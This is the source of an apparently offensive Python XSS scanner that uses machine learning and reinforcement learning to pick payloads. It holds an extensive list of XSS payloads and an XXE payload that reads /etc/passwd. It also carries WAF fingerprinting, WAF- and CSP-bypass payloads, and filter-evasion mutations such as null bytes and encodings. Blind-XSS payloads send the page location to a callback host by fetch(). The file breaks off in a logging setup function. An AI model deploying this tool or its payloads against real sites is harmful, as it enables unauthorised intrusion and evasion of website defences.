#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# --- IMPORTS ---
import requests
import asyncio
import aiohttp
import random
import re
import logging
import json
import threading
import sys
import sqlite3
import time
import pickle
import pandas as pd
import queue
import signal
import csv
import os
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, quote
from bs4 import BeautifulSoup
from bs4.element import Comment # Import Comment for HTML comment detection
from collections import deque
from colorama import Fore, Style, init
import argparse # Keep argparse for potential future non-interactive CLI arguments, but inputs will be prompted interactively
import multiprocessing # For CPU core count
from concurrent.futures import ThreadPoolExecutor

# Imports for Deep Learning
import numpy as np
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
from sklearn.preprocessing import StandardScaler
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Input
# Imports for Selenium
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import WebDriverException, TimeoutException, UnexpectedAlertPresentException
    from selenium.webdriver.common.action_chains import ActionChains
    SELENIUM_AVAILABLE = True
except ImportError:
    print(f"{Fore.RED}Selenium is not installed. Some features will be disabled. Run: pip install selenium{Style.RESET_ALL}")
    SELENIUM_AVAILABLE = False


# --- UTILITY FUNCTIONS ---
def normalize_domain(url: str) -> str:
    """
    Normalise une URL ou un nom de domaine pour une comparaison cohérente.
    Cela inclut la suppression du schéma (http/https) et du sous-domaine 'www.'.
    Exemples:
    - 'https://www.example.com/path' devient 'example.com'
    - 'http://sub.domain.co.uk' devient 'sub.domain.co.uk'
    """
    parsed_url = urlparse(url)
    domain = parsed_url.netloc or parsed_url.path # Utilise netloc si present, sinon path

    # Supprime 'www.' au debut du domaine si present
    if domain.startswith('www.'):
        domain = domain[4:]

    # Supprime les chemins ou parametres eventuels, ne garde que le domaine pur
    domain = domain.split('/')[0].split('?')[0].split('#')[0]

    # Convertit en minuscules pour la coherence
    return domain.lower()

# Content from payload_generation.py
def generate_payloads(server_type='generic'):
    # Using a set to remove duplicates before returning as a list
    payloads_set = set()

    # Generic payloads
    payloads_set.update([
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # XSS Locator (Polyglot)
        '\'\'; alert(String.fromCharCode(88,83,83))//\'\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\'\';alert(String.fromCharCode(88,83,83))//\'\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\'\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        # NEW: Payload to create a specific marker in DOM for advanced DOM XSS detection
        '<script>document.body.innerHTML += "<div id=\\"xss_dom_marker\\"></div>"; /*alert(\\"DOM XSS execution marker\\");*/</script>',
        # NEW: Basic JavaScript event payloads for interaction simulation
        '<a onclick="alert(document.domain)">Clickable XSS</a>',
        '<img src=x onmouseover="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        # More aggressive payloads
        '<svg onload=alert(1)>', # SVG XSS
        '<details open ontoggle=alert(1)>', # HTML5 event
        '\'"-alert(1)-"\'', # Polyglot without script tags
        '<style>@keyframes x{}@-moz-keyframes x{}@-webkit-keyframes x{}body{animation:x;}input{animation:x;}img{animation:x;}</style><img style="animation-name:x;" onerror="alert(1)">' # CSS animation XSS
    ])

    # Server-specific payloads
    if server_type == 'nginx':
        pass
    elif server_type == 'apache':
        pass
    elif server_type == 'iis':
        pass

    return list(payloads_set)


# Content from deep_learning.py
class DeepLearningModel:
    def __init__(self, input_dim: int = 23): # input_dim set to 23 to match extract_features()
        self.input_dim = input_dim
        self.model = self.build_model()
        self.is_trained = False
        self.scaler = StandardScaler()

    def build_model(self):
        # Build a simple feed-forward classifier. Uses self.input_dim.
        model = Sequential()
        model.add(Input(shape=(self.input_dim,)))
        model.add(Dense(128, activation='relu'))
        model.add(Dense(64, activation='relu'))
        model.add(Dense(32, activation='relu'))
        model.add(Dense(1, activation='sigmoid'))
        model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])
        return model

    def validate_feature_matrix(self, X):
        # Guard against feature/model mismatches.
        if hasattr(X, 'shape'):
            cols = X.shape[1] if len(X.shape) > 1 else 1
        else:
            # assume list-like
            cols = len(X[0]) if X and hasattr(X[0], '__len__') else len(X)
        if cols != self.input_dim:
            raise ValueError(f"Feature length {cols} does not match model input_dim {self.input_dim}. "
                             f"Update input_dim or extract_features().")


    def train(self, X, y):
        if not X or not y:
            logging.warning(f"{Fore.YELLOW}[DL Model] No training data provided to train the model.{Style.RESET_ALL}")
            self.is_trained = False
            return

        X_np = np.array(X).astype(np.float32)
        y_np = np.array(y).astype(np.float32)

        if X_np.ndim != 2 or X_np.shape[1] != self.model.input_shape[1]:
            logging.error(f"{Fore.RED}[DL Model] Incorrect input data shape for training. Expected (*, {self.model.input_shape[1]}), Received {X_np.shape}.{Style.RESET_ALL}")
            self.is_trained = False
            return
        
        try:
            X_train, X_test, y_train, y_test = train_test_split(X_np, y_np, test_size=0.3, random_state=42)
            
            X_train_scaled = self.scaler.fit_transform(X_train)
            X_test_scaled = self.scaler.transform(X_test)
            
            logging.info(f"{Fore.MAGENTA}[DL Model] Training DeepLearning model with {len(X_train_scaled)} samples...{Style.RESET_ALL}")
            self.model.fit(X_train_scaled, y_train, epochs=20, batch_size=16, verbose=0) 
            
            predictions = (self.model.predict(X_test_scaled, verbose=0) > 0.5).astype("int32")
            accuracy = accuracy_score(y_test, predictions)
            logging.info(f"{Fore.GREEN}[DL Model] Model trained with accuracy: {accuracy:.2f}{Style.RESET_ALL}")
            self.is_trained = True
        except Exception as e:
            logging.error(f"{Fore.RED}[DL Model] Error during model training: {e}{Style.RESET_ALL}")
            self.is_trained = False

    def predict(self, X):
        if not self.is_trained:
            logging.warning(f"{Fore.YELLOW}[DL Model] Model is not trained. Returning random predictions.{Style.RESET_ALL}")
            return np.array([random.choice([0, 1]) for _ in X]).astype("int32")
        
        X_np = np.array(X).astype(np.float32)
        if X_np.ndim != 2 or X_np.shape[1] != self.model.input_shape[1]:
            logging.error(f"{Fore.RED}[DL Model] Incorrect input data shape for prediction. Expected (*, {self.model.input_shape[1]}), Received {X_np.shape}. Returning random predictions.{Style.RESET_ALL}")
            return np.array([random.choice([0, 1]) for _ in X]).astype("int32")

        try:
            X_scaled = self.scaler.transform(X_np)
            predictions = (self.model.predict(X_scaled, verbose=0) > 0.5).astype("int32")
            return predictions
        except Exception as e:
            logging.error(f"{Fore.RED}[DL Model] Error during model prediction: {e}. Returning random predictions.{Style.RESET_ALL}")
            return np.array([random.choice([0, 1]) for _ in X]).astype("int32")


# Content from nlp_analysis.py
def analyze_content(html_content, payload_to_find=None, driver=None):
    """
    Analyzes HTML content to extract relevant information for determining
    injection points, detecting sanitization, and the payload's reflection type.
    Args:
        html_content (str): The HTML content of the page.
        payload_to_find (str): The payload that was injected, for specific reflection analysis.
        driver (WebDriver): Optional Selenium WebDriver instance for live DOM analysis.
    Returns:
        dict: A dictionary containing the analyzed information.
    """
    logging.info(f"{Fore.MAGENTA}[NLP] Performing NLP content analysis...{Style.RESET_ALL}")
    soup = BeautifulSoup(html_content, 'html.parser')
    
    analysis_results = {
        "forms_found": False,
        "input_fields_count": 0,
        "scripts_found": False,
        "comments_found": False,
        "has_eval_or_write": False,
        "has_common_sanitization_patterns": False,
        "reflected_location_type": "none", # 'text', 'attribute', 'script_content', 'script_attribute', 'comment'
        "payload_reflection_level": -1, # New feature: nesting level of the payload in the DOM
        "dom_nodes_added": 0, # New feature: number of DOM nodes added
        "attr_modifications": 0, # New feature: number of attribute modifications
        "new_script_tags": 0, # New feature: count of new script tags injected
        "new_iframe_tags": 0, # New feature: count of new iframe tags injected
        "new_svg_tags": 0 # New feature: count of new svg tags injected
    }

    # Form and Input Analysis
    forms = soup.find_all('form')
    if forms:
        analysis_results["forms_found"] = True
        for form in forms:
            inputs = form.find_all(['input', 'textarea', 'select'])
            analysis_results["input_fields_count"] += len(inputs)
            for input_tag in inputs:
                if input_tag.has_attr('onkeyup') or input_tag.has_attr('onkeydown') or input_tag.has_attr('onkeypress') or input_tag.has_attr('onblur') or input_tag.has_attr('onchange'):
                    analysis_results["has_common_sanitization_patterns"] = True
                if input_tag.has_attr('maxlength'):
                    analysis_results["has_common_sanitization_patterns"] = True

    # Script Analysis
    scripts = soup.find_all('script')
    if scripts:
        analysis_results["scripts_found"] = True
        for script in scripts:
            if script.string:
                script_content = script.string.lower()
                if re.search(r'(eval|document\.write|document\.writeln|innerHTML)\s*\(', script_content):
                    analysis_results["has_eval_or_write"] = True
                if re.search(r'(encodeURIComponent|decodeURIComponent|escape|unescape|htmlspecialchars|strip_tags)\s*\(', script_content):
                    analysis_results["has_common_sanitization_patterns"] = True
            if script.has_attr('src') and re.search(r'(eval|document\.write)', script.get('src', '').lower()):
                 analysis_results["has_eval_or_write"] = True

    # Comment Analysis
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))
    if comments:
        analysis_results["comments_found"] = True

    # Payload Reflection Location & Nesting Level
    if payload_to_find:
        escaped_payload = re.escape(payload_to_find)
        
        # Check in script content
        for script_tag in soup.find_all('script'):
            if script_tag.string and re.search(escaped_payload, script_tag.string):
                analysis_results["reflected_location_type"] = "script_content"
                analysis_results["payload_reflection_level"] = len(list(script_tag.parents))
                break
            for attr_val in script_tag.attrs.values():
                if isinstance(attr_val, str) and re.search(escaped_payload, attr_val):
                    analysis_results["reflected_location_type"] = "script_attribute"
                    analysis_results["payload_reflection_level"] = len(list(script_tag.parents))
                    break
            if analysis_results["reflected_location_type"] != "none": break
        
        if analysis_results["reflected_location_type"] == "none":
            # Check in attribute values
            for tag in soup.find_all(True):
                for attr, value in tag.attrs.items():
                    if isinstance(value, str) and re.search(escaped_payload, value):
                        analysis_results["reflected_location_type"] = "attribute"
                        analysis_results["payload_reflection_level"] = len(list(tag.parents))
                        break
                if analysis_results["reflected_location_type"] != "none": break

        if analysis_results["reflected_location_type"] == "none":
            # Check in comments
            for comment in soup.find_all(string=lambda text: isinstance(text, Comment) and re.search(escaped_payload, text)):
                analysis_results["reflected_location_type"] = "comment"
                analysis_results["payload_reflection_level"] = -1 # Cannot determine nesting for comments with BS4
                
        if analysis_results["reflected_location_type"] == "none":
            # Check in plain text/HTML body
            if re.search(escaped_payload, html_content):
                analysis_results["reflected_location_type"] = "text"
                # Find the tag containing the payload and get its nesting level
                # Note: This can be tricky with plain regex. A robust solution would require a tree search.
                # For simplicity, we'll find the first parent with the payload and count parents.
                payload_element = soup.find(string=lambda text: payload_to_find in text)
                if payload_element:
                    analysis_results["payload_reflection_level"] = len(list(payload_element.parents))
                else:
                    analysis_results["payload_reflection_level"] = 0

    # New: More detailed DOM feedback for IA, requires live driver if available
    if driver:
        try:
            # Get initial and final DOM sizes (approximate node count)
            initial_dom_size = driver.execute_script("return document.getElementsByTagName('*').length;")
            
            # Re-fetch the page source after potential DOM manipulations by payload
            current_page_source = driver.page_source
            current_soup = BeautifulSoup(current_page_source, 'html.parser')
            final_dom_size = len(current_soup.find_all(True)) # Count all tags

            # Simple heuristic for nodes added: if final is significantly larger than initial
            # This is a very rough estimate and would need a baseline for accuracy
            analysis_results["dom_nodes_added"] = max(0, final_dom_size - initial_dom_size)

            # Count new script/iframe/svg tags
            analysis_results["new_script_tags"] = len(current_soup.find_all('script')) - len(soup.find_all('script'))
            analysis_results["new_iframe_tags"] = len(current_soup.find_all('iframe')) - len(soup.find_all('iframe'))
            analysis_results["new_svg_tags"] = len(current_soup.find_all('svg')) - len(soup.find_all('svg'))

            # Check for attribute modifications (more complex, requires comparing DOM snapshots or specific checks)
            # For simplicity here, we can infer some attribute modifications if we see event handlers from payload
            if 'onmouseover' in str(payload_to_find).lower() or 'onclick' in str(payload_to_find).lower() or 'onerror' in str(payload_to_find).lower():
                # This is a heuristic: assume an attribute modification if an event handler payload was used
                # A true check would involve comparing 'on' attributes before and after
                analysis_results["attr_modifications"] = 1

        except Exception as e:
            logging.warning(f"{YELLOW}[NLP] Error performing live DOM analysis with driver: {e}{Style.RESET_ALL}")
                
    logging.info(f"{Fore.GREEN}[NLP] Analysis complete. Results: {analysis_results}{Style.RESET_ALL}")
    return analysis_results


# Content from reinforcement_learning.py
class ReinforcementLearningAgent:
    def __init__(self, alpha=0.1, gamma=0.9, epsilon=0.1):
        self.q_table = {}
        self.alpha = alpha
        self.gamma = gamma
        self.epsilon = epsilon

    # UPDATED: get_state_key to include detailed NLP and CSP strength information, and new console features
    # Ensure this matches the 23 features from extract_features
    def get_state_key(self, url, param, method, injection_context, server_type, fuzz_results_summary, waf_detected, csp_present, csp_strength, dom_nodes_added, attr_modifications, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, browser_console_errors_count, payload_in_console_logs):
        fuzz_key = tuple(sorted(fuzz_results_summary.items())) if fuzz_results_summary else ()
        
        # Include CSP info and rich DOM indicators in the state key for more granular learning
        csp_key = (csp_present, csp_strength)
        
        # Aggregate NLP features more concisely for the state key
        nlp_key = (nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type)
        
        # New console features
        console_key = (browser_console_errors_count > 0, payload_in_console_logs)

        # The key needs to reflect all the features used in extract_features to be consistent
        return (normalize_domain(url), param, method, injection_context, server_type, fuzz_key, waf_detected, csp_key, dom_nodes_added, attr_modifications, nlp_key, console_key)


    # UPDATED: learn method signature to match the new state key parameters
    # Ensure this matches the 23 features from extract_features
    def learn(self, url, param, payload, method, reward, injection_context, server_type, fuzz_results_summary, waf_detected, csp_present, csp_strength, dom_nodes_added, attr_modifications, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, browser_console_errors_count, payload_in_console_logs):
        state = self.get_state_key(url, param, method, injection_context, server_type, fuzz_results_summary, waf_detected, csp_present, csp_strength, dom_nodes_added, attr_modifications, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, browser_console_errors_count, payload_in_console_logs)
        action = payload

        if state not in self.q_table:
            self.q_table[state] = {}
        if action not in self.q_table[state]:
            self.q_table[state][action] = 0.0
        
        current_q = self.q_table[state].get(action, 0.0)
        self.q_table[state][action] = current_q + self.alpha * (reward - current_q)
        
        logging.info(f"{Fore.MAGENTA}[RL Agent] Learning: State={state}, Action={action}, Reward={reward}. New Q-value: {self.q_table[state][action]:.2f}{Style.RESET_ALL}")

    def select_action(self, state, available_payloads):
        if not available_payloads:
            logging.warning(f"{Fore.YELLOW}[RL Agent] No payloads available for selection.{Style.RESET_ALL}")
            return "empty_payload"

        if random.uniform(0, 1) < self.epsilon:
            logging.info(f"{Fore.CYAN}[RL Agent] Exploration: Selecting random action (epsilon-greedy).{Style.RESET_ALL}")
            return random.choice(available_payloads)
        else:
            if state not in self.q_table or not self.q_table[state]:
                logging.info(f"{Fore.CYAN}[RL Agent] Exploitation: State unknown or empty, selecting random action.{Style.RESET_ALL}")
                return random.choice(available_payloads)
            
            current_state_actions = self.q_table[state]
            available_payloads_set = set(available_payloads)

            exploitable_actions = {
                p: q_val for p, q_val in current_state_actions.items() if p in available_payloads_set
            }

            if exploitable_actions:
                best_payload = max(exploitable_actions, key=exploitable_actions.get)
                logging.info(f"{Fore.GREEN}[RL Agent] Exploitation: Selected payload: '{best_payload}' (Q-value: {exploitable_actions[best_payload]:.2f}).{Style.RESET_ALL}")
                return best_payload
            else:
                logging.info(f"{Fore.CYAN}[RL Agent] No learned actions available in current payload set for exploitation. Selecting random action.{Style.RESET_ALL}")
                return random.choice(available_payloads)


# --- WAF DETECTION & CSP ANALYSIS ---
def detect_waf(response_headers, response_text):
    """
    Identifies a WAF based on response headers and body.
    Returns the name of the WAF if detected, otherwise 'None'.
    """
    waf_signatures = {
        'cloudflare': {'server': 'cloudflare', 'via': 'cloudflare', 'cf-ray': None},
        'incapsula': {'x-cdn': 'incapsula', 'x-iinfo': None},
        'sucuri': {'x-sucuri-cache': None, 'x-sucuri-cloudproxy-request-id': None},
        'akamai': {'server': 'akamai', 'x-akamai-transformed': None},
        'modsecurity': {'server': 'mod_security', 'x-powered-by': 'mod_security', 'x-served-by': 'mod_security'},
        'barracuda': {'x-barracuda-waf': None},
        'fastly': {'x-fastly-backend-request-id': None},
        'azure_application_gateway': {'server': 'microsoft-iis', 'x-powered-by': 'asp.net', 'x-ms-request-id': None},
        'f5_big_ip': {'x-backside-transport': None},
        'wordfence': {'x-wordfence-waf': None},
        'imperva': {'x-imperva-requestid': None},
    }

    waf_detected = 'None'
    response_text_lower = response_text.lower()
    for waf_name, signatures in waf_signatures.items():
        if waf_name == 'cloudflare' and response_text_lower.find('cloudflare-waf') > -1:
            waf_detected = waf_name
            break
        
        for header, value in signatures.items():
            if header in response_headers and (value is None or value in response_headers[header].lower()):
                waf_detected = waf_name
                break
        if waf_detected != 'None':
            break
    
    if waf_detected != 'None':
        logging.critical(f"{Fore.RED}[WAF DETECTED]{END} {waf_detected} a été identifié. Les stratégies de contournement seront ajustées.{Style.RESET_ALL}")

    return waf_detected

def analyze_csp(response_headers):
    """
    Analyzes Content-Security-Policy header.
    Returns (csp_present: bool, csp_strength: str).
    """
    csp_header = response_headers.get('Content-Security-Policy')
    if not csp_header:
        return False, "None"
    
    csp_present = True
    csp_strength = "Weak" # Default to weak if not explicitly strong
    
    # Heuristic for strength: check for common directives like default-src, script-src 'self', 'none'
    if ("default-src 'none'" in csp_header or 
        "script-src 'none'" in csp_header or 
        "script-src 'self'" in csp_header and "unsafe-inline" not in csp_header and "unsafe-eval" not in csp_header):
        csp_strength = "Strong"
    elif "unsafe-inline" in csp_header or "unsafe-eval" in csp_header:
        csp_strength = "Weak" # Even if present, unsafe directives make it weak against XSS
    
    logging.info(f"{Fore.BLUE}[CSP ANALYSIS]{END} CSP present: {csp_present}, Strength: {csp_strength}{Style.RESET_ALL}")
    return csp_present, csp_strength


# --- WAF BYPASS & PAYLOAD GENERATION ---
# Default Interactsh domain (can be overridden by user input for custom callback)
DEFAULT_INTERACTSH_DOMAIN = "oast.pro"

class WAFBypassPayloads:
    def __init__(self, callback_host):
        self.callback_host = callback_host
        self.filter_map = {}
        self.waf_specific_payloads = {
            'cloudflare': [
                # Cloudflare bypasses
                '\'" onerror="alert(1)"',
                '<img src=x on<font>error=alert(1) />',
                '<a href=javascript:alert(1)>xss</a>',
                '<details open ontoggle=alert(1)>',
                '<svg><script>alert(1)</script></svg>'
            ],
            'modsecurity': [
                # ModSecurity bypasses
                '<img src=x onerror=alert(1)>',
                '\'"><script>alert(1)</script>',
                '<a href="javascr\tip\t:alert(1)">Click Me</a>',
                '<svg onload=alert(1)><!--'
            ],
            'imperva': [
                # Imperva bypasses
                '<IMG SRC=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>',
                '<iframe/src=javascripT:alert(1)></iframe>',
                '<marquee onstart=alert(1)>'
            ]
        }

    def update_filters(self, new_fuzz_results):
        self.filter_map.update(new_fuzz_results)
        logging.info(f"{GREEN}[WAF]{END} Filters updated based on fuzzing: {json.dumps(self.filter_map, indent=2)}{Style.RESET_ALL}")

    def apply_bypass(self, payload_str, char_to_bypass, encoding_type):
        if encoding_type == 'html_entity':
            return payload_str.replace(char_to_bypass, f"&#x{ord(char_to_bypass):x};")
        elif encoding_type == 'url_encode':
            return payload_str.replace(char_to_bypass, quote(char_to_bypass))
        elif encoding_type == 'js_escape':
            return payload_str.replace(char_to_bypass, f"\\x{ord(char_to_bypass):02x}")
        return payload_str

    def get_payloads(self, server_type="generic", context="html", detected_waf="None", csp_strength="None"):
        base_payloads = []
        
        if detected_waf != "None" and detected_waf in self.waf_specific_payloads:
            logging.info(f"{Fore.CYAN}[WAF Bypass] Prioritizing payloads for {detected_waf}{Style.RESET_ALL}")
            base_payloads.extend(self.waf_specific_payloads[detected_waf])

        base_payloads.extend(generate_payloads(server_type))

        # Add blind XSS payloads if a callback host is configured
        if self.callback_host and self.callback_host != "n/a":
            blind_xss_payloads = [
                f"<script>fetch('//{self.callback_host}/script?loc='+btoa(window.location))</script>",
                f"<img src=x onerror=fetch('//{self.callback_host}/img?loc='+btoa(window.location))>",
                f"<svg/onload=fetch('//{self.callback_host}/svg?loc='+btoa(window.location))>",
                f"javascript:fetch('//{self.callback_host}/js?loc='+btoa(window.location))",
                f"<body onpageshow=fetch('//{self.callback_host}/body?loc='+btoa(window.location))>",
                f"<iframe src='//{self.callback_host}/iframe'></iframe>",
                f"<link rel=stylesheet href='//{self.callback_host}/css'>",
                f"<object data='//{self.callback_host}/object'></object>"
            ]
            base_payloads.extend(blind_xss_payloads)

        # Standard context-specific payloads (can overlap with generic, but ensures inclusion)
        if context == "html":
            base_payloads.extend(["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"])
        elif context == "attribute":
            base_payloads.extend(["'onmouseover=alert(1) x='", "onfocus=alert(1) autofocus"])
        elif context == "script_content" or context == "script_attribute": # Combined script contexts
            base_payloads.extend(["';alert(1)//", "</script><script>alert(1)</script>"])
        elif context == "url":
            base_payloads.extend(["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"])
        elif context == "comment":
            base_payloads.extend(["--><script>alert(1)</script><!--"])

        # NEW: CSP bypass strategies
        if csp_strength == "Strong":
            # Add CSP bypass payloads if CSP is strong
            csp_bypass_payloads = [
                "<img src=x onerror=alert(1) -- Some bypass specific to strong CSPs",
                "<iframe srcdoc='<script>alert(1)</script>'></iframe>", # Might bypass if iframe-srcdoc is allowed
                "<object data='data:text/html,<script>alert(1)</script>'></object>"
            ]
            base_payloads.extend(csp_bypass_payloads)
        elif csp_strength == "Weak":
            # Add payloads that exploit common CSP weaknesses
            csp_weak_payloads = [
                "<script src='//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script><script>alert(1)</script>", # Trusted CDN bypass
                "<img src='data:image/svg+xml;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'>" # SVG bypass
            ]
            base_payloads.extend(csp_weak_payloads)


        polymorphic_payloads = set(base_payloads)
        for p in base_payloads:
            current_payload = p
            for char, filter_info in self.filter_map.items():
                if filter_info['status'] == 'encoded':
                    current_payload = self.apply_bypass(current_payload, char, filter_info['encoding_type'])
                elif filter_info['status'] == 'filtered':
                    # Add null byte or other bypass for filtered characters
                    if char in ['<', '>', '"', "'"]:
                        current_payload = current_payload.replace(char, f"%00{char}")
            polymorphic_payloads.add(current_payload)
            polymorphic_payloads.add("".join(c.upper() if random.random() > 0.5 else c.lower() for c in p))
            polymorphic_payloads.add(p.replace('<', '&#x3c;').replace('>', '&#x3e;'))
            polymorphic_payloads.add(quote(p))
            polymorphic_payloads.add(p.replace("onerror", "on/**/error"))
            polymorphic_payloads.add(p.replace("alert", "al\x09ert(1)"))
            polymorphic_payloads.add(p.replace('<script>', '<scri\x00pt>')) # Null byte bypass

        return list(polymorphic_payloads)

# --- Character Fuzzer ---
async def perform_character_fuzzing(url, param, session, rate_limiter):
    fuzz_results = {}
    test_chars = ['<', '>', '"', "'", '(', ')', '/', '\\', '`', ';', '{', '}']
    
    if not param:
        logging.warning(f"{YELLOW}[FUZZING]{END} No parameter provided for fuzzing.{Style.RESET_ALL}")
        return fuzz_results

    logging.info(f"{YELLOW}[FUZZING]{END} Running character fuzzer for parameter '{param}' on {url}{Style.RESET_ALL}")

    for char in test_chars:
        await rate_limiter.wait_for_next_request() # Apply rate limit
        encoded_char = quote(char)
        fuzz_payload = f"fuzztest{encoded_char}testfuzz"
        
        test_params = {param: fuzz_payload}
        # For GET requests, append to URL. For POST, prepare form data.
        # This fuzzing is typically done via GET for simplicity in detection.
        full_url = url + '?' + "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])

        status = 'filtered'
        encoding_type = 'none'

        try:
            async with session.get(full_url, timeout=5, ssl=False, headers=get_random_headers()) as response:
                response_text = await response.text()
                
                if response.status >= 400:
                    status = 'blocked'
                elif fuzz_payload in response_text:
                    status = 'reflected'
                else:
                    # Check for common encodings
                    if f"&#x{ord(char):x};" in response_text.lower() or f"&#{ord(char)};" in response_text.lower():
                        status = 'encoded'
                        encoding_type = 'html_entity'
                    elif f"%{ord(char):02X}" in response_text.upper():
                        status = 'encoded'
                        encoding_type = 'url_encode'
                    elif re.search(r'\\x{:02x}|\\u{:04x}'.format(ord(char), ord(char)), response_text, re.IGNORECASE):
                        status = 'encoded'
                        encoding_type = 'js_escape'
                    else:
                        status = 'filtered'
        except Exception as e:
            status = 'error'
            logging.warning(f"{YELLOW}[FUZZING]{END} Error while fuzzing '{char}': {e}{Style.RESET_ALL}")
        
        fuzz_results[char] = {'status': status, 'encoding_type': encoding_type}
        logging.debug(f"  Fuzzed '{char}' -> Status: {status}, Encoding: {encoding_type}")
    
    logging.info(f"{GREEN}[FUZZING]{END} Character fuzzing complete for {param}.{Style.RESET_ALL}")
    return fuzz_results


# --- GENERAL SETUP ---
init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Constants for terminal colors
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\033[94m', '\033[91m', '\033[97m', '\033[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# Setup logging
def setup_logging(domain):
    log_dir = 'logs'
    if not os.path.exists(log_dir):
